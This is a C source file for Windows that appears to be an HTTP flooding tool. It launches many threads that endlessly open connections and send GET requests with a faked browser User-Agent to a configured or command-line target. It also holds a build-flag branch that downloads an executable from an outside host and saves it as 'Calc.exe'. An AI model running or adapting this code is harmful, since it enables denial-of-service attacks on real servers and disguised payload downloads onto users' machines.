#include "ForgeHttp.h"
#include "ForgePort.h"

DWORD WINAPI ForgeAttachThread(PVOID pParameter);

HANDLE g_hAttachThread[MAXIMUM_ATTACH_THREAD] = {0};
ULONG g_ulThreadId[MAXIMUM_ATTACH_THREAD] = {0};
PFORGE_HTTP_ATTACH_PARAMTER g_pForgeHttpParamter = NULL;
ULONG g_SocketCount = 0;

#ifndef _WINDOWS
int __cdecl main(int nArgc,PCHAR pArgv[])
#else
int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLineA,ULONG ulShowCmd)
#endif
{	
	ULONG uli = 0;

	InitializeAttachPortRoutine();
#ifdef DOWNLOAD
	DownloadFileFromUrl("http://www.bioskit.com/fuck.exe","Calc.exe");
#endif
	do 
	{
		g_pForgeHttpParamter = VirtualAlloc(NULL, \
			sizeof(FORGE_HTTP_ATTACH_PARAMTER), \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == g_pForgeHttpParamter);
	RtlZeroMemory(g_pForgeHttpParamter,sizeof(FORGE_HTTP_ATTACH_PARAMTER));

	switch (nArgc)
	{
	case 1:
		RtlCopyMemory(g_pForgeHttpParamter->AttachUrlAddrA, \
			ATTACH_SERVER_URL_ADDRESS, \
			strlen(ATTACH_SERVER_URL_ADDRESS));

		RtlCopyMemory(g_pForgeHttpParamter->AttachUriA, \
			ATTACH_SERVER_RES_ADDRESS, \
			strlen(ATTACH_SERVER_RES_ADDRESS));
		g_pForgeHttpParamter->uAttachPort = ATTACH_SERVER_PORT;

#ifdef _DEBUG
		for (uli = 0;uli < 1;uli++)
		{
			g_hAttachThread[uli] = CreateThread(NULL,0,ForgeAttachThread,g_pForgeHttpParamter,0,&g_ulThreadId[uli]);
		}
		WaitForSingleObject(g_hAttachThread[0],INFINITE);
#else
		for (uli = 0;uli < MAXIMUM_ATTACH_THREAD;uli++)
		{
			g_hAttachThread[uli] = CreateThread(NULL,0,ForgeAttachThread,g_pForgeHttpParamter,0,&g_ulThreadId[uli]);
			printf("Thread Count : %d\n",uli);
		}
		WaitForMultipleObjects(MAXIMUM_ATTACH_THREAD,g_hAttachThread,TRUE,INFINITE);
		system("Pause");
#endif
		break;
	case 2:
		break;
	case 3:
		break;
	case 4:
		{
			RtlCopyMemory(g_pForgeHttpParamter->AttachUrlAddrA,pArgv[1],strlen(pArgv[1]));
			RtlCopyMemory(g_pForgeHttpParamter->AttachUriA,pArgv[3],strlen(pArgv[3]));
			g_pForgeHttpParamter->uAttachPort = atoi(pArgv[2]);
			ForgeAttachThread(g_pForgeHttpParamter);
		}
		break;
	}
	return 0;
}
PCHAR GetResponseHeader(SOCKET ConnectSocket,PCHAR pResponseHeader,PULONG pulLength)
{
	BOOLEAN bEndResponse;
	char c = 0;
	int nIndex = 0;
	ULONG ulResponseHeaderSize = 0;
	bEndResponse = FALSE;
	while(!bEndResponse && nIndex < PAGE_SIZE)
	{
		recv(ConnectSocket,&c,1,0);
		pResponseHeader[nIndex++] = c;
		if(nIndex >= 4)
		{
			if(pResponseHeader[nIndex - 4] == '\r' && \
				pResponseHeader[nIndex - 3] == '\n' && \
				pResponseHeader[nIndex - 2] == '\r' && \
				pResponseHeader[nIndex - 1] == '\n')
			{
				bEndResponse = TRUE;
			}
		}
	}
	ulResponseHeaderSize = nIndex;
	*pulLength = ulResponseHeaderSize;
	return pResponseHeader;
}
BOOLEAN SetTimeOut(SOCKET ConnectSocket,int nTime,int nType)
{
	ULONG ulError;
	if(nType == 0)
	{
		nType = SO_RCVTIMEO;
	}
	else
	{
		nType = SO_SNDTIMEO;
	}
	ulError = setsockopt(ConnectSocket,SOL_SOCKET,nType,(char*)&nTime,sizeof(nTime)); 
	if(ulError)
	{
		return FALSE;
	}
	return TRUE;
}
PCHAR FormatRequestHeader(PCHAR pServerUrl, \
						  PCHAR pSubUri, \
						  PULONG pulLength, \
						  PCHAR pCookie, \
						  PCHAR pReferer, \
						  ULONG ulFrom, \
						  ULONG ulTo, \
						  ULONG ulServerType)
{
	char szTemp[20];
	PCHAR pRequeseHeader;
	pRequeseHeader = NULL;

	do 
	{
		pRequeseHeader = VirtualAlloc(NULL, \
			PAGE_SIZE, \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == pRequeseHeader);
	RtlZeroMemory(pRequeseHeader,PAGE_SIZE);

	strcat(pRequeseHeader,"GET ");
	strcat(pRequeseHeader,pSubUri);
	strcat(pRequeseHeader," HTTP/1.1");
    strcat(pRequeseHeader,"\r\n");

    strcat(pRequeseHeader,"Host:");
	strcat(pRequeseHeader,pServerUrl);
    strcat(pRequeseHeader,"\r\n");

	if(pReferer != NULL)
	{
		strcat(pRequeseHeader,"Referer:");
		strcat(pRequeseHeader,pReferer);
		strcat(pRequeseHeader,"\r\n");		
	}

    strcat(pRequeseHeader,"Accept:*/*");
    strcat(pRequeseHeader,"\r\n");

    strcat(pRequeseHeader,"User-Agent:Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)");
    strcat(pRequeseHeader,"\r\n");

	strcat(pRequeseHeader,"Connection:Keep-Alive");
	strcat(pRequeseHeader,"\r\n");

	if(pCookie != NULL)
	{
		strcat(pRequeseHeader,"Set Cookie:0");
		strcat(pRequeseHeader,pCookie);
		strcat(pRequeseHeader,"\r\n");
	}

	if(ulFrom > 0)
	{
		strcat(pRequeseHeader,"Range: bytes=");
		_ltoa(ulFrom,szTemp,10);
		strcat(pRequeseHeader,szTemp);
		strcat(pRequeseHeader,"-");
		if(ulTo > ulFrom)
		{
			_ltoa(ulTo,szTemp,10);
			strcat(pRequeseHeader,szTemp);
		}
		strcat(pRequeseHeader,"\r\n");
	}
	
	strcat(pRequeseHeader,"\r\n");

	*pulLength = strlen(pRequeseHeader);
	return pRequeseHeader;
}
DWORD WINAPI ForgeAttachThread(PVOID pParameter)
{
	PFORGE_HTTP_ATTACH_PARAMTER pForgeHttpParamter;

	pForgeHttpParamter = (PFORGE_HTTP_ATTACH_PARAMTER)pParameter;

	while (TRUE)
	{
		ForgeHttpAttach(pForgeHttpParamter->AttachUrlAddrA, \
			pForgeHttpParamter->uAttachPort, \
			pForgeHttpParamter->AttachUriA);
		InterlockedIncrement(&g_SocketCount);
		printf("Socket Count: %08x\n",g_SocketCount);
		Sleep(3000);
	}
	return 0;
}
BOOLEAN ForgeHttpAttach(PCHAR pAttachUrlAddr,USHORT uAttachPort,PCHAR pAttachUri)
{
	SOCKET ConnectSocket;
	struct sockaddr_in ServerSocket;
	struct protoent *ppe;
	PCHAR pRequest,pRecvBuf;
	CHAR RecvDat[1];
	int nRet;
	BOOLEAN bIsRecv;
	WSADATA wsaData;
	struct in_addr ip_addr;
	struct hostent* remoteHost;


	pRequest = NULL;
	pRecvBuf = NULL;
	bIsRecv = FALSE;

	nRet = WSAStartup(MAKEWORD(2,2),&wsaData);
	if (nRet != NO_ERROR)
	{
#ifdef _DEBUG
		printf("WSAStartup failed with error: %d\n",nRet);
#endif
		return 0;
	}
	remoteHost = gethostbyname(pAttachUrlAddr);
	memcpy(&ip_addr,remoteHost->h_addr_list[0],4);

	RtlZeroMemory(&ServerSocket,sizeof(struct sockaddr_in));
	ServerSocket.sin_family = AF_INET;
	ServerSocket.sin_port = htons(uAttachPort);
	ServerSocket.sin_addr = ip_addr;
	pRequest = FormatRequestHeader(pAttachUrlAddr, \
		pAttachUri, \
		&nRet, \
		NULL, \
		NULL, \
		0, \
		0, \
		0);
#ifdef _DEBUG
	printf("%s\n",pRequest);
#endif
	ppe = getprotobyname("tcp");
	ConnectSocket = socket(PF_INET,SOCK_STREAM,ppe->p_proto);       
	nRet = connect(ConnectSocket,(struct sockaddr *)&ServerSocket,sizeof(ServerSocket));
	if(nRet < 0)
	{
#ifdef _DEBUG
		printf("connect error!!! flag = %d\n",nRet);
#endif
		WSACleanup();
		return FALSE;
	}
	nRet = send(ConnectSocket,pRequest,strlen(pRequest),0);
	if (nRet == SOCKET_ERROR)
	{
#ifdef _DEBUG
		printf("send() failed with error: %d\n",WSAGetLastError());
#endif
		closesocket(ConnectSocket);
		WSACleanup();
		return FALSE;
	}
#ifdef _DEBUG
	printf("Bytes Sent: %d\n",nRet);
#endif
	GetResponseHeader(ConnectSocket,pRequest,&nRet);
	SetTimeOut(ConnectSocket,10000,0);
	SetTimeOut(ConnectSocket,10000,1);

	do
	{
		if (bIsRecv)
		{
			do 
			{
				pRecvBuf = VirtualAlloc(NULL, \
					PAGE_SIZE, \
					MEM_COMMIT | MEM_RESERVE, \
					PAGE_READWRITE);
			} while (NULL == pRecvBuf);
			RtlZeroMemory(pRecvBuf,PAGE_SIZE);
			nRet = recv(ConnectSocket,pRecvBuf,PAGE_SIZE,0);
			if (pRecvBuf)
			{
				VirtualFree(pRecvBuf,0,MEM_RELEASE);
			}
		}
		else
		{
			nRet = recv(ConnectSocket,RecvDat,1,0);
			break;
		}
		if (nRet > 0)
		{
#ifdef _DEBUG
			printf("Bytes received: %d\n",nRet);
#endif
		}
	} while(nRet > 0);
	if (pRequest)
	{
		VirtualFree(pRequest,0,MEM_RELEASE);
	}
	closesocket(ConnectSocket);
	return TRUE;
}


